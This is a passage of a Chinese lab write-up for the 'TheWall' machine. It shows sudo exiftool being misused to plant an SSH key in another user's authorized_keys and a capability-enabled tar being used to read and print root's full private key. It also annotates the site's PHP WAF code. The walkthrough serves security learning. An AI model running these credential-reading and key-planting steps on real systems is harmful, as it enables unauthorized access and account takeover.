                                unset($db[$row]);
                        }
                }

                file_put_contents($dbf,serialize($db));
                return $db;
        }

        private static function check($db) {
                if (is_array($db)){
                        if (count($db) > 1) {
                                return array_count_values(array_column($db, 'ip'))[$_SERVER['REMOTE_ADDR']];
                        }
                } else {
                        return 0;
                }
        }

        private static function write($db,$dbf) {
                file_put_contents(self::path.$dbf,serialize($db));
        }

        private static function add($db,$tm=1) {
                array_push($db,['time'=>time() + (60*$tm), 'ip'=>$_SERVER['REMOTE_ADDR']]);
                return $db;
        }

        public static function DoWAF ($hit){
                while (!@mkdir(self::path.'db.lock',0777)) { 
                        usleep(100000); 
                }

                $db = self::loadClean(self::dbFile);
                $bl = self::loadClean(self::blFile);

                if( self::check($bl) > 0) {
                        self::forbidden();
                } elseif($hit>0) {
                        $db = self::add($db);
                        self::write($db, self::dbFile);

                        if (self::check($db) >= self::attempts) {
                                self::write(self::add($bl,self::outTime), self::blFile);
                                self::forbidden();
                        }

                        if($hit == 403) {
                                self::forbidden();
                        } else {
                                self::notfound();
                        }
                }
                rmdir(self::path.'db.lock');
        }

        public static function forbidden () {
                rmdir(self::path.'db.lock');
                header('HTTP/1.0 403 Forbidden', true, 403);
                die('<h1>Forbidden</h1>');
        }

        public static function notfound () {
                rmdir(self::path.'db.lock');
                header('HTTP/1.0 404 Not Found', true, 404);
                die('<h1>Not Found</h1>');
        }
}

WAF::DoWAF(isset($_GET['e'])?$_GET['e']:0);
?>
```

### exiftool提权john

https://gtfobins.github.io/gtfobins/exiftool/#sudo

```bash
(remote) www-data@TheWall:/var/www/html$ sudo -l
Matching Defaults entries for www-data on TheWall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on TheWall:
    (john : john) NOPASSWD: /usr/bin/exiftool
(remote) www-data@TheWall:/var/www/html$ ls -la /home/john/.ssh/
ls: cannot open directory '/home/john/.ssh/': Permission denied
(remote) www-data@TheWall:/var/www/html$ cd /var/tmp
(remote) www-data@TheWall:/var/tmp$ touch id_rsa;chmod 600 id_rsa
(remote) www-data@TheWall:/var/tmp$ LFILE=id_rsa
(remote) www-data@TheWall:/var/tmp$ INPUT=/home/john/.ssh/id_rsa
(remote) www-data@TheWall:/var/tmp$ sudo -u john exiftool -filename=$LFILE $INPUT
Error: File not found - /home/john/.ssh/id_rsa
    0 image files updated
    1 files weren't updated due to errors
```

写一个公钥进去吧：

```bash
# kali 创建公钥
┌──(kali💀kali)-[~/temp/TheWall]
└─$ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.20.10.5'
# Host 172.20.10.5 found: line 19
# Host 172.20.10.5 found: line 20
# Host 172.20.10.5 found: line 21
/home/kali/.ssh/known_hosts updated.
Original contents retained as /home/kali/.ssh/known_hosts.old

┌──(kali💀kali)-[~/temp/TheWall]
└─$ ssh-keygen -t rsa -f /home/kali/temp/TheWall/id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/temp/TheWall/id_rsa
Your public key has been saved in /home/kali/temp/TheWall/id_rsa.pub
The key fingerprint is:
SHA256:aOQla3y6vboDrxhPq9aNgDYUPeCU77VRVDfgsVHS5zw kali@kali
The key's randomart image is:
+---[RSA 3072]----+
| o+   ...*++     |
|oo o   .. *...   |
| .o . + .o  +    |
| . . * =     E   |
|... . X S     .  |
|.o...+ o         |
|. oo.=.          |
|  .=o.+o         |
| .o.+.++o.       |
+----[SHA256]-----+

┌──(kali💀kali)-[~/temp/TheWall]
└─$ ls -la                                                                       
total 456
drwxr-xr-x   3 kali kali   4096 Aug  7 13:28 .
drwxr-xr-x 117 kali kali   4096 Aug  7 08:06 ..
-rw-------   1 kali kali   2590 Aug  7 13:28 id_rsa
-rw-r--r--   1 kali kali    563 Aug  7 13:28 id_rsa.pub
drwxr-xr-x   3 root root   4096 Aug  7 08:30 reports
-rw-r--r--   1 kali kali 445422 Aug  7 12:39 result.txt

┌──(kali💀kali)-[~/temp/TheWall]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDZFs33LRKJ9qZ4j/VL5gW2qAl/Zkx+Ina4iXBHZYuyNDR1Ts6ZlPE/d6/y3ipNqpphqXbstkSSrAnkC6M+Nc4ixOyvGkMN8EBXteRD93Bc3o0ZFNIvaE0AWLvWTmRehPA10pJmE29+bPeFCwUENW+LhNjt9OsrHILP2pWMQcOhQVS+5Y3pU4tUyRgrm0NsmqiPY0A+Jhdkus5BbP8PR00t3DEt1bo9vuwtonY6XX+feBdUgkHV8jxAmRgbzSGuBkEzI3DEA1+XXhN8tOqvIYIGbBUDl0n6TU93bgqJfTrxROVYhfB++OiLFzYHrMvOxflxUQfsN8wbrPM0f0mVE2PFMK7FGu2fRf4hAF1ObkoZoDAwFy12myxVA30LIVsGYkGu1CNiTRjCDTzXVY1/i4QuhZ/q7RaA46AS6GPSd8RkKqrj16+DV068nNvFt80eIRa1eu65McpBQI5X1rAmIl2NPQEkpnYYc03IPwfOhPYbWXhRbcXgm+vnugWufZKIFk= kali@kali
```

```bash
# attacked 拷贝公钥
(remote) www-data@TheWall:/var/tmp$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDZFs33LRKJ9qZ4j/VL5gW2qAl/Zkx+Ina4iXBHZYuyNDR1Ts6ZlPE/d6/y3ipNqpphqXbstkSSrAnkC6M+Nc4ixOyvGkMN8EBXteRD93Bc3o0ZFNIvaE0AWLvWTmRehPA10pJmE29+bPeFCwUENW+LhNjt9OsrHILP2pWMQcOhQVS+5Y3pU4tUyRgrm0NsmqiPY0A+Jhdkus5BbP8PR00t3DEt1bo9vuwtonY6XX+feBdUgkHV8jxAmRgbzSGuBkEzI3DEA1+XXhN8tOqvIYIGbBUDl0n6TU93bgqJfTrxROVYhfB++OiLFzYHrMvOxflxUQfsN8wbrPM0f0mVE2PFMK7FGu2fRf4hAF1ObkoZoDAwFy12myxVA30LIVsGYkGu1CNiTRjCDTzXVY1/i4QuhZ/q7RaA46AS6GPSd8RkKqrj16+DV068nNvFt80eIRa1eu65McpBQI5X1rAmIl2NPQEkpnYYc03IPwfOhPYbWXhRbcXgm+vnugWufZKIFk= kali@kali' > authorized_keys 
(remote) www-data@TheWall:/var/tmp$ INPUT=authorized_keys                        
(remote) www-data@TheWall:/var/tmp$ LFILE=/home/john/.ssh/authorized_keys
(remote) www-data@TheWall:/var/tmp$ sudo -u john exiftool -filename=$LFILE $INPUT
Warning: Error removing old file - authorized_keys
    1 image files updated
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408080249037.png" alt="image-20240808013804448" style="zoom:50%;" />

### tar提权root

```bash
john@TheWall:~$ ls -la
total 32
drwxr-xr-x 4 john john 4096 Oct 19  2022 .
drwxr-xr-x 3 root root 4096 Oct 17  2022 ..
lrwxrwxrwx 1 john john    9 Oct 19  2022 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Oct 17  2022 .bash_logout
-rw-r--r-- 1 john john 3526 Oct 17  2022 .bashrc
drwxr-xr-x 3 john john 4096 Oct 19  2022 .local
-rw-r--r-- 1 john john  807 Oct 17  2022 .profile
drwx------ 2 john john 4096 Aug  7 21:36 .ssh
-rw-r--r-- 1 john john   33 Oct 19  2022 user.txt
john@TheWall:~$ sudo -l
-bash: sudo: command not found
john@TheWall:~$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
john@TheWall:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

发现tar有读的权限，尝试进行提权：https://gtfobins.github.io/gtfobins/tar/#file-read

```bash
john@TheWall:~$ LFILE=/root/.ssh/id_rsa
john@TheWall:~$ /usr/sbin/tar xf "$LFILE" -I '/bin/bash -c "cat 1>&2"'
tar (child): /root/.ssh/id_rsa: Cannot open: No such file or directory
tar (child): Error is not recoverable: exiting now
/usr/sbin/tar: Child returned status 2
/usr/sbin/tar: Error is not recoverable: exiting now
john@TheWall:~$ cd /
john@TheWall:/$ ls -la
total 76
drwxr-xr-x  18 root root  4096 Oct 19  2022 .
drwxr-xr-x  18 root root  4096 Oct 19  2022 ..
lrwxrwxrwx   1 root root     7 Oct 17  2022 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Oct 17  2022 boot
drwxr-xr-x  17 root root  3160 Aug  7 21:18 dev
drwxr-xr-x  72 root root  4096 Aug  7 21:18 etc
drwxr-xr-x   3 root root  4096 Oct 17  2022 home
-rw-------   1 root root  2602 Oct 19  2022 id_rsa
-rw-r--r--   1 root root   566 Oct 19  2022 id_rsa.pub
lrwxrwxrwx   1 root root    31 Oct 17  2022 initrd.img -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root    31 Oct 17  2022 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Oct 17  2022 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Oct 17  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Oct 17  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Oct 17  2022 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct 17  2022 lost+found
drwxr-xr-x   4 root root  4096 Oct 17  2022 media
drwxr-xr-x   2 root root  4096 Oct 17  2022 mnt
drwxr-xr-x   2 root root  4096 Oct 17  2022 opt
dr-xr-xr-x 137 root root     0 Aug  7 21:18 proc
drwx------   4 root root  4096 Oct 19  2022 root
drwxr-xr-x  18 root root   540 Aug  7 21:37 run
lrwxrwxrwx   1 root root     8 Oct 17  2022 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Oct 17  2022 srv
dr-xr-xr-x  13 root root     0 Aug  7 21:18 sys
drwxrwxrwt   9 root root  4096 Aug  7 21:39 tmp
drwxr-xr-x  14 root root  4096 Oct 17  2022 usr
drwxr-xr-x  12 root root  4096 Oct 17  2022 var
lrwxrwxrwx   1 root root    28 Oct 17  2022 vmlinuz -> boot/vmlinuz-5.10.0-18-amd64
lrwxrwxrwx   1 root root    28 Oct 17  2022 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
john@TheWall:/$ LFILE=/id_rsa
john@TheWall:/$ /usr/sbin/tar xf "$LFILE" -I '/bin/bash -c "cat 1>&2"'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvgS2V50JB5doFy4G99JzapbZWie7kLRHGrsmRk5uZPFPPtH/m9xS
FPJMi5x3EWnrUW6MpPE9I3tT1EEaA/IoDApV1cn7rw7dt9LkEJrWn/MfsXr5B1wGzof66V
ZFKKzg9Znl787TMOxA86O4FhlYyfifw/LxJYJXaZhOsXMtbeEKDPx1gMvpuc8q3P90JiJi
wlYcsk3ZbobzbSFn4ZRTI5/PgleYPuEgfmNfAQNrc4+UfcWiDODUcD/NB1KcIxVO0AaNKt
X3mXDssKNDJGEr3Y1XiYms37ZxW5c4tR1Mt9Nne04XNRj8cYL7MagwyyA2npXrAbie/XTr
XkxlS7Vd1kv3I2dKqRxEdwUP+qT++3EYCowFPcq2thCj4Dg4fT9hQTFmX7GAOP0JOOx/7B
ATAe8BQNPC1kk17C7ongfUtFrNGhEUvFuEModewNBlS4Y/nTc6s5b6WXjOQb3y85ob0UzT
tcaj0hAYJuZlYpUAk2Vp7Fnl+GjZ45MOSNLSEj2zAAAFiJcGz4WXBs+FAAAAB3NzaC1yc2
EAAAGBAL4EtledCQeXaBcuBvfSc2qW2Vonu5C0Rxq7JkZObmTxTz7R/5vcUhTyTIucdxFp
61FujKTxPSN7U9RBGgPyKAwKVdXJ+68O3bfS5BCa1p/zH7F6+QdcBs6H+ulWRSis4PWZ5e
/O0zDsQPOjuBYZWMn4n8Py8SWCV2mYTrFzLW3hCgz8dYDL6bnPKtz/dCYiYsJWHLJN2W6G
820hZ+GUUyOfz4JXmD7hIH5jXwEDa3OPlH3Fogzg1HA/zQdSnCMVTtAGjSrV95lw7LCjQy
RhK92NV4mJrN+2cVuXOLUdTLfTZ3tOFzUY/HGC+zGoMMsgNp6V6wG4nv10615MZUu1XdZL
9yNnSqkcRHcFD/qk/vtxGAqMBT3KtrYQo+A4OH0/YUExZl+xgDj9CTjsf+wQEwHvAUDTwt
ZJNewu6J4H1LRazRoRFLxbhDKHXsDQZUuGP503OrOW+ll4zkG98vOaG9FM07XGo9IQGCbm
ZWKVAJNlaexZ5fho2eOTDkjS0hI9swAAAAMBAAEAAAGAdPNRhvsP46w8VIfvoffVMXVGsU
ZjGtzaJompNPxw1Y/vxipZuAQSQPIgSo0ye3VFcAkqZxpTFtOA9NJcwLD6FO8HhV2bmlL8
A3e5Br9F+YwZpZKaUv1A8zyeIZ8HUdGVY5QlAUO6mBHQqCPL2U4gZ66uJlwQL5XZVxR22q
CZBVfMZ9G6QFtAryvipcJUKmRfhFybrOJdQLmueSxmU2CHCxYBEaf3/DtzVFa00lrYd3eX
XRGWe3alSbD679bYYn9pwvlsNBA+41x01+8mlO0P3MyV1xF88Wei/SpispilNXFmJwaZxJ
wpnyOlxeJ5a2QqlwX0/BWrHAJHa5M3WY94Icr8up3XmdPhXIeTkvmLkwpGXskmVUJCqZvX
PSBXohOTCMybyV4bkL6sAYBiQfcLIUiTwG9ezgh+wFLnZ+6zDJnXC56Vv3iwMaIdsed02x
J3aNeexLes6OJLzEkDoelKPnMt0G0WfdcIcDuAi7zDIO9g3bHZChdicPQjLuy4wfqBAAAA
wHk0HcCZiVs+mK/ulmaCvDfcs/Asv8YglqR/buHnyYl3dTaluTT+1qPXzOgoepMTI6D+3x
sFJyiP7IGCr9BunHElkfL0o6iJZ3l5uAebZLIk7sTY3qmeniEfglPDTvzKMyPyKpV+fqvk
dI78nJb3zjMoQulMWm80RZpvOi25vukb1/1kKMWtiUzHYnHj4FGbJ2TIZuYp5CHLEBzFth
E2PlhksW3akPc4+FPTTUkwDCp8CeyQqEzLNdvQXl60eXH5WwAAAMEA38btg8SZhxuiH8ZC
CSQym/Sk7688eNQcd81mZqPVtf6ifcuf86yFqCTQH0nHeWWwq5HSwarJLhhEYxyJgqIy31
lso2c2q0LT84ua6LQ7S9Y7TBomIpw3Notmb2bO4QcHtZQE59YKbGQiT3E3hL4WjDVpzSg+
czA0BwKRzE79r4HMbAp6aUd4mm1u0b9y3uNbWbhbc26HUJDnPaZnHNnYmhhBhHKwc8WKMF
HLsDiiieftdpKt8fRbd7DZFxdOiD+NAAAAwQDZYVer9vJOrn+/pq+jy7fmIAsGdknLsPOt
yDKXnizj1TQhelZIfoz0Iu9nNbIKWzvzuS2p5mOpGGQTSaIGka9FumUYWvLWrlAEE+jeRX
a8KN3nrQp6EtO08ZXUyzAeiQwWiIjUm8JFeYtqxhlfVy76OGRRBcwYhA7wVTapXn6z7zfi
/2Jia/yz6Rju7pTIL2q93asuJK6JrCm9ynj7u9GjEIuruXQpgKOl7Vj3IA48WWzxI/11V3
kwidXsel+Zgj8AAAAMcm9vdEBUaGVXYWxsAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408080249038.png" alt="image-20240808014839778" style="zoom:50%;" />

## 额外探索

### root id_rsa

root 的私钥位置在根目录，是配置问题：

```bash
john@TheWall:/etc/ssh$ ls -la
total 616
drwxr-xr-x  4 root root   4096 Oct 19  2022 .
drwxr-xr-x 72 root root   4096 Aug  7 21:18 ..
-rw-r--r--  1 root root 577771 Jul  1  2022 moduli
-rw-r--r--  1 root root   1650 Jul  1  2022 ssh_config
drwxr-xr-x  2 root root   4096 Jul  1  2022 ssh_config.d
-rw-r--r--  1 root root   3272 Oct 19  2022 sshd_config
drwxr-xr-x  2 root root   4096 Jul  1  2022 sshd_config.d
-rw-------  1 root root    505 Oct 17  2022 ssh_host_ecdsa_key
-rw-r--r--  1 root root    174 Oct 17  2022 ssh_host_ecdsa_key.pub
-rw-------  1 root root    399 Oct 17  2022 ssh_host_ed25519_key
-rw-r--r--  1 root root     94 Oct 17  2022 ssh_host_ed25519_key.pub
-rw-------  1 root root   2602 Oct 17  2022 ssh_host_rsa_key
-rw-r--r--  1 root root    566 Oct 17  2022 ssh_host_rsa_key.pub
john@TheWall:/etc/ssh$ cat ssh_config

# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Include /etc/ssh/ssh_config.d/*.conf

Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
john@TheWall:/etc/ssh$ cat sshd_config
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin yes
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
```

其实是个很简单的道理，嘿嘿。。。

```bash
root@TheWall:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+BLZXnQkHl2gXLgb30nNqltlaJ7uQtEcauyZGTm5k8U8+0f+b3FIU8kyLnHcRaetRboyk8T0je1PUQRoD8igMClXVyfuvDt230uQQmtaf8x+xevkHXAbOh/rpVkUorOD1meXvztMw7EDzo7gWGVjJ+J/D8vElgldpmE6xcy1t4QoM/HWAy+m5zyrc/3QmImLCVhyyTdluhvNtIWfhlFMjn8+CV5g+4SB+Y18BA2tzj5R9xaIM4NRwP80HUpwjFU7QBo0q1feZcOywo0MkYSvdjVeJiazftnFblzi1HUy302d7Thc1GPxxgvsxqDDLIDaelesBuJ79dOteTGVLtV3WS/cjZ0qpHER3BQ/6pP77cRgKjAU9yra2EKPgODh9P2FBMWZfsYA4/Qk47H/sEBMB7wFA08LWSTXsLuieB9S0Ws0aERS8W4Qyh17A0GVLhj+dNzqzlvpZeM5BvfLzmhvRTNO1xqPSEBgm5mVilQCTZWnsWeX4aNnjkw5I0tISPbM= root@TheWall
root@TheWall:~/.ssh# cd /
root@TheWall:/# cat authorized_keys
cat: authorized_keys: No such file or directory
root@TheWall:/# ls
bin   dev  home    id_rsa.pub  initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  id_rsa  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
root@TheWall:/# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+BLZXnQkHl2gXLgb30nNqltlaJ7uQtEcauyZGTm5k8U8+0f+b3FIU8kyLnHcRaetRboyk8T0je1PUQRoD8igMClXVyfuvDt230uQQmtaf8x+xevkHXAbOh/rpVkUorOD1meXvztMw7EDzo7gWGVjJ+J/D8vElgldpmE6xcy1t4QoM/HWAy+m5zyrc/3QmImLCVhyyTdluhvNtIWfhlFMjn8+CV5g+4SB+Y18BA2tzj5R9xaIM4NRwP80HUpwjFU7QBo0q1feZcOywo0MkYSvdjVeJiazftnFblzi1HUy302d7Thc1GPxxgvsxqDDLIDaelesBuJ79dOteTGVLtV3WS/cjZ0qpHER3BQ/6pP77cRgKjAU9yra2EKPgODh9P2FBMWZfsYA4/Qk47H/sEBMB7wFA08LWSTXsLuieB9S0Ws0aERS8W4Qyh17A0GVLhj+dNzqzlvpZeM5BvfLzmhvRTNO1xqPSEBgm5mVilQCTZWnsWeX4aNnjkw5I0tISPbM= root@TheWall
```

只是公钥一样的缘故，我还纳闷为啥在根目录还生效呢。。。。

### 防火墙

分析一下防火墙：

```php
<?php
class WAF
{
    // 定义常量
    const attempts = 200;      // 最大尝试次数
    const outTime  = 2;        // 被列入黑名单的时间（分钟）
    const path     = "/var/www/data/";  // 存储文件的路径
    const dbFile   = "waf.db.txt";     // 数据库文件名
    const blFile   = "waf.bl.txt";     // 黑名单文件名

    // 加载清理数据
    private static function loadClean($dbf)
    {
        $dbf = self::path . $dbf;   // 拼接完整路径

        if (file_exists($dbf)) {    // 如果文件存在
            $db = unserialize(file_get_contents($dbf));  // 读取并反序列化文件内容
        } else {                    // 如果文件不存在
            if (!is_dir(self::path)) {  // 检查路径是否存在
                mkdir(self::path);      // 如果不存在则创建路径
            }
        }

        if (!is_array($db)) {       // 确保读取的内容是一个数组
            $db = array();          // 如果不是数组，则初始化为空数组
        }

        // 清理过期条目
        foreach ($db as $row => $sub_array) {
            if ($sub_array['time'] < time()) {  // 如果时间戳小于当前时间
                unset($db[$row]);              // 删除该条目
            }
        }

        // 保存更新后的数组到文件
        file_put_contents($dbf, serialize($db));

        return $db;                           // 返回更新后的数组
    }

    // 检查数据库中指定IP的出现次数
    private static function check($db)
    {
        if (is_array($db)) {                  // 确保传入的是数组
            if (count($db) > 1) {             // 如果数组中有多个条目
                // 计算远程地址出现的次数
                return array_count_values(array_column($db, 'ip'))[$_SERVER['REMOTE_ADDR']];
            }
        } else {
            return 0;                         // 如果不是数组，返回0
        }
    }

    // 写入数据库
    private static function write($db, $dbf)
    {
        file_put_contents(self::path . $dbf, serialize($db));  // 序列化数组并写入文件
    }

    // 添加条目
    private static function add($db, $tm = 1)
    {
        // 添加新条目到数组
        array_push($db, ['time' => time() + (60 * $tm), 'ip' => $_SERVER['REMOTE_ADDR']]);
        return $db;                               // 返回更新后的数组
    }

    // 主处理函数
    public static function DoWAF($hit)
    {
        // 创建锁文件
        while (!@mkdir(self::path . 'db.lock', 0777)) {  
            usleep(100000);                       // 如果文件已存在，则等待
        }

        // 加载清理数据库和黑名单
        $db = self::loadClean(self::dbFile);
        $bl = self::loadClean(self::blFile);

        // 如果黑名单中有当前IP地址，则返回403
        if (self::check($bl) > 0) {
            self::forbidden();
        } elseif ($hit > 0) {                     // 如果$hit大于0
            $db = self::add($db);                 // 在数据库中添加新条目
            self::write($db, self::dbFile);       // 更新数据库文件

            // 如果达到最大尝试次数，则将IP加入黑名单
            if (self::check($db) >= self::attempts) {
                self::write(self::add($bl, self::outTime), self::blFile);
                self::forbidden();
            }

            // 根据$hit的值决定返回的状态码
            if ($hit == 403) {
                self::forbidden();
            } else {
                self::notfound();
            }
        }

        // 删除锁文件
        rmdir(self::path . 'db.lock');
    }

    // 返回403 Forbidden
    public static function forbidden()
    {
        rmdir(self::path . 'db.lock');           // 删除锁文件
        header('HTTP/1.0 403 Forbidden', true, 403);  // 设置HTTP头部
        die('<h1>Forbidden</h1>');               // 输出HTML并终止脚本
    }

    // 返回404 Not Found
    public static function notfound()
    {
        rmdir(self::path . 'db.lock');           // 删除锁文件
        header('HTTP/1.0 404 Not Found', true, 404);  // 设置HTTP头部
        die('<h1>Not Found</h1>');               // 输出HTML并终止脚本
    }
}

// 调用DoWAF函数
WAF::DoWAF(isset($_GET['e']) ? $_GET['e'] : 0);
?>
```

基本上和AI说的一样：

> 1. **数据存储**:
>    - 数据存储在两个文件中：`waf.db.txt` 和 `waf.bl.txt`，分别用于存储最近的访问记录和被禁止的IP地址。
>    - 访问记录包括IP地址和过期时间。
> 2. **黑名单机制**:
>    - 如果一个IP地址触发了黑名单条件，则会被添加到黑名单中，并在一段时间后自动解除。
>    - 黑名单中的IP地址将无法继续访问。
> 3. **访问频率限制**:
>    - 当某个IP地址的访问次数超过预设的阈值（`$hit` 参数）时，会增加其在数据库中的计数。
>    - 如果计数超过 `attempts`（默认为200次），则该IP地址会被加入黑名单。
> 4. **请求处理**:
>    - 请求通过查询字符串中的 `e` 参数传递给 `DoWAF` 函数。
>    - 如果 `e` 参数不存在或为0，则不会触发任何动作。
>    - 如果 `e` 参数为非0值，则会根据 `hit` 的值决定是否增加访问计数或直接返回403。
> 5. **状态码返回**:
>    - 如果IP地址在黑名单中，返回403 Forbidden。
>    - 如果 `hit` 参数为403，返回403 Forbidden。
>    - 否则返回404 Not Found。

尝试反序列化以及配置代理池暂时未果，回头再弄。

## 参考

https://pwn.ar/n/thewall

https://medium.com/@josemlwdf/thewall-eb99f02e1502